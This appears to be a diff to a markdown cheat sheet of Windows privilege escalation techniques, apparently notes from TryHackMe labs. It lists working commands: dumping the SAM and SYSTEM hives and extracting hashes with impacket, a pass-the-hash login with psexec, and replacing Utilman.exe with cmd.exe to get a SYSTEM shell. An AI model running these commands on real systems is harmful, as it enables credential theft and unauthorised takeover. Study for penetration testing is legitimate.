@@ -642,3 +642,29 @@ Go to dir of AccessChk and then:
 ## Vulnerable Software
 ### Get all software
     wmic product get name,version,vendor
+
+## Dangerous privileges
+    whoami /priv 
+### SeBackup / SeRestore
+The SeBackup and SeRestore privileges allow users to read and write to any file in the system <br>
+#### Backup SAM and SYSTEM hashes
+    reg save hklm\system C:\Users\THMBackup\system.hive
+    reg save hklm\sam C:\Users\THMBackup\sam.hive
+#### Retrieve user's password hashes (example with impacket)
+    python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+#### Use Administrator's hash to perform Pass-the-Hash attack
+    python3.9 /opt/impacket/examples/psexec.py -hashes <PASSWORD_HASH> administrator@<MACHINE_IP>
+
+### SeTakeOwnership
+The SeTakeOwnership privilege allows a user to take ownership of any object on the system <br>
+Example with Utilman.exe abuse: <br>
+#### Take ownership of Utilman.exe (application that provide Ease of Access options during lock screen)
+    takeown /f C:\Windows\System32\Utilman.exe
+#### Give full access to the user
+    icacls C:\Windows\System32\Utilman.exe /grant <THMTakeOwnership>:F
+#### Change utilman.exe by cmd 
+    copy cmd.exe utilman.exe
+Then lock the screen and use the cmd running as system user
+
+### SeImpersonate / SeAssignPrimaryToken
+These privileges allow a process to impersonate other users and act on their behalf. <br>
